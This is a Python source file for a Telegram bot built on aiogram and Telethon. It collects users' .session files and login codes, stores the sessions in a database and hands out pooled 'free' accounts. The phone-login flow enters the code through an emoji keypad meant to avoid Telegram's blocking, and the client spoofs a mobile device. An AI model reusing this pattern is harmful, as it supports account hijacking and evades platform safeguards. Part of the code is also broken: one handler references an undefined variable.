import random
import shutil
from pathlib import Path

from aiogram import F, Router
from aiogram.fsm.context import FSMContext
from aiogram.types import Message, CallbackQuery
from loguru import logger  # https://github.com/Delgan/loguru
from telethon import TelegramClient
from telethon.errors import PhoneNumberInvalidError, FloodWaitError
from telethon.sessions import StringSession

from account_manager.auth import CheckingAccountsValidity, get_account_info
from core.config import MAX_SESSIONS_PER_BATCH, mobile_device, API_HASH, API_ID
from database.database import User, AccountFree, write_account_to_user_table
from database.personal_tracking import write_account_to_db
from handlers.user.personal_tracking import PersonalTrackingState, execute_sign_in
from handlers.user_language import determines_user_language
from keyboards.keyboards import back_keyboard, connect_account_keyboard, emoji_code_keypad_kb
from locales.locales import t
from states.states import MyStates

router = Router(name=__name__)


@router.callback_query(F.data == "account_connect_free")
async def handle_connect_account_free_cb(callback: CallbackQuery, state: FSMContext):
    """
    Обработчик инлайн-кнопки "🔐 Подключить свободный аккаунт".
    Подключает случайный свободный аккаунт пользователю
    """
    await callback.answer()
    # await connect_account_free_internal(callback.message, callback.from_user, state)
    await state.clear()
    # Определяем язык пользователя, который пользователь выбрал при старте бота
    user_lang = determines_user_language(message_or_callback=callback.from_user.id)
    user, created = User.get_or_create(
        user_id=callback.from_user.id,
        defaults={
            "username": callback.from_user.username,
            "first_name": callback.from_user.first_name,
            "last_name": callback.from_user.last_name,
            "language": "unset"
        }
    )
    free_accounts = list(AccountFree.select())
    if not free_accounts:
        logger.warning(f"Нет доступных свободных аккаунтов для пользователя {user.user_id}")
        await message.answer(
            text=t("no_free_accounts", lang=user_lang),
            reply_markup=back_keyboard(lang=user_lang, callback_data="menu_settings")
        )
        return
    selected_account = random.choice(free_accounts)
    session_string = selected_account.session_string
    phone_number = selected_account.phone_number
    logger.info(f"Подключаем свободный аккаунт {phone_number} пользователю {user.user_id}")
    write_account_to_db(
        session_string=session_string,
        user_id=user.user_id
    )
    selected_account.delete_instance()
    await message.answer(
        text=t("account_connected_free", lang=user_lang),
        reply_markup=back_keyboard(lang=user_lang, callback_data="menu_settings")
    )


def sanitization_file_name(document, account_id):
    """
    Очистка имени файла от недопустимых символов (файлов сессии).
    :param document: Файл сессии Telegram в формате Telethon
    :param account_id: ID аккаунта пользователя
    :return: local_file_path - Путь к файлу сессии. safe_file_name - Имя файла сессии.
    """
    try:
        folder_path = Path(f"accounts/{account_id}")
        folder_path.mkdir(parents=True, exist_ok=True)

        safe_file_name = "".join(c for c in document.file_name if c.isalnum() or c in "._-")
        local_file_path = folder_path / safe_file_name

        return local_file_path, safe_file_name
    except Exception as e:
        logger.exception(f"Ошибка при очистке имени файла: {e}")
        return None, None


def delete_directory(folder_path):
    """Удаляет папку и все файлы в ней (рекурсивно)"""
    if not folder_path:
        return
    path = Path(folder_path)
    if path.is_file():
        path = path.parent
    try:
        shutil.rmtree(path)
        logger.info(f"Папка {path} и всё её содержимое удалены.")
    except FileNotFoundError:
        logger.warning(f"Ошибка: указанная папка не существует: {path}")
    except PermissionError:
        logger.error(f"Ошибка: нет прав на удаление: {path}")
    except OSError as e:
        logger.error(f"Произошла ошибка при удалении: {e}")


"""Меню подключения аккаунтов"""


@router.callback_query(F.data == "account_connect_menu")
async def handle_account_connect_menu(callback: CallbackQuery, state: FSMContext):
    """Меню подключения аккаунтов с выбором способов подключения аккаунтов"""
    await state.clear()  # Очищаем состояние
    # Определяем язык пользователя, который пользователь выбрал при старте бота
    user_lang = determines_user_language(message_or_callback=callback.from_user.id)

    await callback.message.answer(
        text="Выберите способ подключения аккаунта. По номеру телефона или через сессию Telethon или использования свободного аккаунта.",
        reply_markup=connect_account_keyboard(lang=user_lang)
    )


"""Подключение аккаунта через сессию Telethon"""


@router.callback_query(F.data == "settings_section_channels")
async def handle_connect_account_cb(callback: CallbackQuery, state: FSMContext):
    """Обрабатывает команду подключения аккаунта (инлайн) (Подключение аккаунта через сессию Telethon)"""
    await state.clear()
    # Определяем язык пользователя, который пользователь выбрал при старте бота
    user_lang = determines_user_language(message_or_callback=callback.from_user.id)
    await callback.answer()

    await callback.message.answer(
        text=t("connect_account", lang=user_lang),
        reply_markup=back_keyboard(lang=user_lang, callback_data="menu_settings")
    )
    await state.set_state(MyStates.waiting_for_session_file_user)


# ✅ Фильтр: только документы И только в нужном состоянии
@router.message(MyStates.waiting_for_session_file_user, F.document)
async def handle_account_file(message: Message, state: FSMContext):
    """Обработчик приёма файла сессии (.session) от пользователя"""

    # Определяем язык пользователя, который пользователь выбрал при старте бота
    user_lang = determines_user_language(message_or_callback=message.from_user.id)
    local_file_path = None
    try:
        logger.info(f"User {message.from_user.id} отправил файл: {message.document.file_name}")
        # ✅ Проверяем расширение — если не .session, остаёмся в состоянии
        if not message.document.file_name.endswith('.session'):
            await message.answer(t("invalid_session_file", lang=user_lang))
            return  # state НЕ сбрасываем — ждём правильный файл

        local_file_path, safe_file_name = sanitization_file_name(document=message.document,
                                                                 account_id=message.from_user.id)
        await message.bot.download(message.document, destination=local_file_path)
        logger.info(f"✅ Файл скачан: {local_file_path}")
        await message.answer(t("session_file_received", lang=user_lang, filename=safe_file_name))
        session_path_without_ext = str(local_file_path.with_suffix(""))
        checker = CheckingAccountsValidity(path=session_path_without_ext)
        client = await checker.connect_client()
        if client:
            account_info = await get_account_info(client)
            session_string = StringSession.save(client.session)
            # Записываем сессию в базу данных users_account и personal_tracking
            write_account_to_user_table(
                user_id=message.from_user.id,
                session_string=session_string,
                phone_number=account_info.get("phone") or "",
                user_username=message.from_user.username or "",
                user_firstname=message.from_user.first_name or ""
            )
            write_account_to_db(
                session_string=session_string,
                user_id=message.from_user.id
            )
            await client.disconnect()
            logger.success(f"✅ Сессия добавлена: {account_info.get('phone')} | {account_info.get('first_name')}")
            await message.answer(
                t("session_connected_success", lang=user_lang, filename=safe_file_name, phone=account_info.get("phone"),
                  name=account_info.get("first_name")),
                parse_mode="HTML"
            )
        else:
            logger.warning(f"❌ Сессия {safe_file_name} не валидна для пользователя {message.from_user.id}")
            await message.answer(
                t("session_validation_failed", lang=user_lang, filename=safe_file_name),
                parse_mode="HTML"
            )
    except Exception as e:
        logger.exception(f"Ошибка при обработке сессии пользователя {message.from_user.id}: {e}")
        # await message.answer(t("session_check_error", lang=user_lang))
    finally:
        # ✅ Удаляем временную папку и все файлы в ней
        if local_file_path:
            delete_directory(folder_path=local_file_path.parent)
        # ✅ Сбрасываем состояние только в конце
        await state.clear()


@router.callback_query(F.data == "admin_connect_account")
async def admin_connecting_account_cb(callback: CallbackQuery, state: FSMContext):
    """Админ нажимает кнопку → бот просит .session файл(ы) (инлайн). Инициирует процесс добавления сессий администратором"""
    await callback.answer()
    await state.clear()
    # Определяем язык пользователя, который пользователь выбрал при старте бота
    user_lang = determines_user_language(message_or_callback=callback.from_user.id)
    # ✅ Инициализируем очередь файлов в состоянии
    await state.update_data(received_files=[], processed_count=0, success_count=0, fail_count=0)
    await state.set_state(MyStates.waiting_for_session_file)
    await callback.message.answer(
        t("connect_account_ask_session", lang=user_lang),
        reply_markup=back_keyboard(lang=user_lang, callback_data="menu_admin_panel")
    )
    logger.info(f"Админ {callback.from_user.id} начал добавление новых сессий")


@router.message(MyStates.waiting_for_session_file, F.document)
async def receive_session_file(message: Message, state: FSMContext):
    """Получаем .session файл(ы) от админа и обрабатываем по очереди"""
    # user_id = message.from_user.id  # получаем id пользователя
    # TODO Сделать единое определение языка пользователя во всем проекте
    # user = User.get(User.user_id == user_id)
    # Определяем язык пользователя, который пользователь выбрал при старте бота
    user_lang = determines_user_language(message_or_callback=message.from_user.id)
    document = message.document  # получаем файл сессии
    logger.info(f"User {message.from_user.id} отправил файл: {document.file_name}")
    # ✅ Проверяем расширение
    if not document.file_name.endswith('.session'):
        await message.answer(t("connect_account_invalid_file", lang=user_lang))
        return
    # ✅ Получаем данные из состояния
    data = await state.get_data()
    if len(data.get("received_files", [])) >= MAX_SESSIONS_PER_BATCH:
        await message.answer(
            t("connect_account_limit_reached", lang=user_lang, max=MAX_SESSIONS_PER_BATCH)
        )
        return
    received_files = data.get("received_files", [])
    processed_count = data.get("processed_count", 0)
    success_count = data.get("success_count", 0)
    fail_count = data.get("fail_count", 0)
    # ✅ Добавляем файл в очередь
    received_files.append(document)
    await state.update_data(received_files=received_files)
    # ✅ Показываем прогресс, если файлов больше 1
    total = len(received_files)
    if total > 1:
        await message.answer(
            t("connect_account_file_queued", lang=user_lang, filename=document.file_name, total=total))
    local_file_path = None
    try:
        # ✅ Создаём папку для временного хранения
        # sessions_dir = creates_temporary_folder_for_accounts()

        # ✅ Санитизация имени файла
        local_file_path, safe_file_name = sanitization_file_name(document=document, account_id=message.from_user.id)
        # ✅ Скачиваем файл
        # ToDo проверить в будущем document.file_id вместо document
        await message.bot.download(document, destination=local_file_path)
        # ✅ Извлекаем путь без расширения для Telethon
        session_path_without_ext = str(local_file_path.with_suffix(""))
        # ✅ Проверяем валидность аккаунта
        checker = CheckingAccountsValidity(path=session_path_without_ext)
        client = await checker.connect_client()
        if client:
            account_info = await get_account_info(client)
            phone = account_info.get("phone") or "unknown"
            first_name = account_info.get("first_name") or ""
            # ✅ Конвертируем в StringSession и сохраняем в БД
            session_string = StringSession.save(client.session)
            write_account_to_user_table(
                user_id=message.from_user.id,
                session_string=session_string,
                phone_number=phone,
                user_username=message.from_user.username or "",
                user_firstname=message.from_user.first_name or ""
            )
            write_account_to_db(session_string=session_string, user_id=message.from_user.id)
            await client.disconnect()
            # ✅ Обновляем статистику
            success_count += 1
            logger.success(f"✅ Сессия добавлена: {phone} | {first_name}")
            # ✅ Отправляем результат для этого файла
            await message.answer(
                t("connect_account_success", lang=user_lang, filename=safe_file_name, phone=phone, name=first_name),
                parse_mode="HTML"
            )
        else:
            fail_count += 1
            logger.warning(f"❌ Сессия не валидна: {safe_file_name}")
            await message.answer(t("connect_account_failed", lang=user_lang, filename=safe_file_name),
                                 parse_mode="HTML")
    except Exception as e:
        logger.exception(f"Ошибка при обработке {document.file_name}: {e}")
        fail_count += 1
        await message.answer(t("connect_account_error", lang=user_lang, filename=safe_file_name), parse_mode="HTML")
    finally:
        # ✅ Удаляем временную папку и все файлы в ней
        if local_file_path:
            delete_directory(folder_path=local_file_path.parent)
        # ✅ Обновляем состояние: файл обработан
        processed_count += 1
        await state.update_data(
            processed_count=processed_count,
            success_count=success_count,
            fail_count=fail_count
        )
        await message.answer(
            t("connect_account_processing_done", lang=user_lang),
            parse_mode="HTML",
            reply_markup=back_keyboard(lang=user_lang)
        )
    # ✅ Очищаем очередь в состоянии
    await state.update_data(received_files=[], processed_count=0, success_count=0, fail_count=0)


def cleanup_session_files(parsing_dir: str, root_dirs: list[str] | None = None):
    """
    Полная очистка временных .session файлов
    :param parsing_dir: Папка с временными сессиями (будет удалена полностью)
    :param root_dirs: Список корневых папок для поиска "забытых" .session файлов
    :return: dict со статистикой очистки
    """
    result = {
        "parsing_dir_deleted": False,
        "root_files_deleted": 0,
        "errors": []
    }
    # ✅ 1. Удаляем папку accounts/parsing целиком
    try:
        parsing_path = Path(parsing_dir)
        if parsing_path.exists() and parsing_path.is_dir():
            shutil.rmtree(parsing_path)
            logger.info(f"🗑️ Папка удалена: {parsing_dir}")
            result["parsing_dir_deleted"] = True
        else:
            logger.debug(f"Папка {parsing_dir} не существует — пропускаем")
    except Exception as e:
        error_msg = f"Ошибка удаления {parsing_dir}: {e}"
        logger.exception(error_msg)
        result["errors"].append(error_msg)

    # ✅ 2. Очищаем корневые папки от "забытых" .session файлов
    dirs_to_scan = root_dirs or [".", "accounts", "data"]  # Папки для сканирования по умолчанию
    for root_dir in dirs_to_scan:
        try:
            root_path = Path(root_dir)
            if not root_path.exists():
                continue
            # Ищем .session файлы ТОЛЬКО в этой папке (не рекурсивно!)
            for session_file in root_path.glob("*.session"):
                # ❌ Пропускаем важные системные файлы, если нужно
                if session_file.name.startswith("bot_session") or session_file.name.startswith("main_"):
                    logger.debug(f"⏭️ Пропущен системный файл: {session_file.name}")
                    continue
                # ✅ Удаляем найденный файл
                session_file.unlink()
                result["root_files_deleted"] += 1
                logger.info(f"🗑️ Удалён файл из корня: {session_file.name}")
        except Exception as e:
            error_msg = f"Ошибка очистки папки {root_dir}: {e}"
            logger.exception(error_msg)
            result["errors"].append(error_msg)
    logger.debug("🧹 Очистка завершена")


# ==================== АВТОРИЗАЦИЯ АККАУНТА ПО НОМЕРУ ТЕЛЕФОНА ====================

@router.callback_query(F.data == "pt_auth_phone")
async def cb_start_phone_auth(callback: CallbackQuery, state: FSMContext):
    """
    Начало шага ввода номера телефона. Если аккаунт подключает Администратор, то данные будут записываться в общую папку с аккаунтами
    """
    await state.set_state(PersonalTrackingState.waiting_for_phone_number)
    await callback.message.answer(
        "📱 <b>Подключение Telegram-аккаунта по номеру телефона</b>\n\n"
        "Пожалуйста, введите Ваш номер телефона в международном формате.\n"
        "<i>Пример: <code>+79991234567</code> или <code>+380991234567</code></i>",
        parse_mode="HTML"
    )
    await callback.answer()


@router.message(PersonalTrackingState.waiting_for_phone_number)
async def process_phone_number_input(message: Message, state: FSMContext):
    """Обработка ввода номера телефона и запрос 5-значного кода через Telethon"""
    phone = message.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone

    if len(phone) < 10 or not phone[1:].isdigit():
        await message.answer(
            "⚠️ Некорректный формат номера. Введите номер начиная со знака + (например, <code>+79991234567</code>):",
            parse_mode="HTML")
        return

    status_msg = await message.answer(
        "🔄 <i>Запрашиваем код подтверждения у Telegram... Пожалуйста, подождите до прихода кода. Если код не пришел, попробуйте позже.</i>",
        parse_mode="HTML")

    client = TelegramClient(
        StringSession(),
        api_id=int(API_ID) if API_ID else 0,
        api_hash=str(API_HASH) if API_HASH else "",
        device_model=mobile_device["device_model"],
        system_version=mobile_device["system_version"],
        app_version=mobile_device["app_version"],
        lang_code=mobile_device["lang_code"],
        system_lang_code=mobile_device["system_lang_code"]
    )

    try:
        await client.connect()
        send_code = await client.send_code_request(phone)
        session_str = client.session.save()
        await client.disconnect()

        await state.update_data(
            phone_number=phone,
            phone_code_hash=send_code.phone_code_hash,
            session_str=session_str,
            current_code=""
        )
        await state.set_state(PersonalTrackingState.waiting_for_auth_code)

        await status_msg.edit_text(
            f"📩 <b>Код подтверждения отправлен в Ваш Telegram!</b>\n\n"
            f"📱 <b>Номер:</b> <code>{phone}</code>\n"
            f"🔢 <b>Введенный код:</b> <code>_ _ _ _ _</code>\n\n"
            f"⚠️ <i>Используйте эмодзи-клавиатуру ниже для выбора цифр кода, чтобы избежать блокировки от Telegram:</i>",
            reply_markup=emoji_code_keypad_kb(),
            parse_mode="HTML"
        )
    except PhoneNumberInvalidError:
        await status_msg.edit_text("❌ Введен недействительный номер телефона. Попробуйте еще раз.")
        await state.clear()
    except FloodWaitError as fwe:
        await status_msg.edit_text(f"⏳ Слишком много попыток. Пожалуйста, подождите {fwe.seconds} секунд.")
        await state.clear()
    except Exception as e:
        logger.exception(f"❌ Ошибка отправки кода на номер {phone}: {e}")
        await status_msg.edit_text(f"❌ Ошибка при запросе кода: {e}")
        await state.clear()


@router.callback_query(F.data.startswith("pt_digit_"), PersonalTrackingState.waiting_for_auth_code)
async def cb_handle_emoji_digit(callback: CallbackQuery, state: FSMContext):
    """Обработка ввода цифр кода с помощью эмодзи-клавиатуры"""
    action = callback.data.replace("pt_digit_", "")
    data = await state.get_data()
    current_code = data.get("current_code", "")

    if action == "clear":
        current_code = current_code[:-1]
    elif action == "submit":
        if len(current_code) < 5:
            await callback.answer("⚠️ Введите все 5 цифр кода подтверждения!", show_alert=True)
            return
        await execute_sign_in(callback, state, current_code)
        return
    elif action.isdigit():
        if len(current_code) < 5:
            current_code += action

    await state.update_data(current_code=current_code)

    digits_display = " ".join(list(current_code) + ["_"] * (5 - len(current_code)))
    phone = data.get("phone_number", "")

    try:
        await callback.message.edit_text(
            f"📩 <b>Код подтверждения отправлен в Ваш Telegram!</b>\n\n"
            f"📱 <b>Номер:</b> <code>{phone}</code>\n"
            f"🔢 <b>Введенный код:</b> <code>{digits_display}</code>\n\n"
            f"⚠️ <i>Используйте эмодзи-клавиатуру ниже для выбора цифр кода:</i>",
            reply_markup=emoji_code_keypad_kb(),
            parse_mode="HTML"
        )
    except Exception:
        pass

    await callback.answer()

    # Авто-отправка при вводе 5 цифр
    if len(current_code) == 5:
        await execute_sign_in(callback, state, current_code)
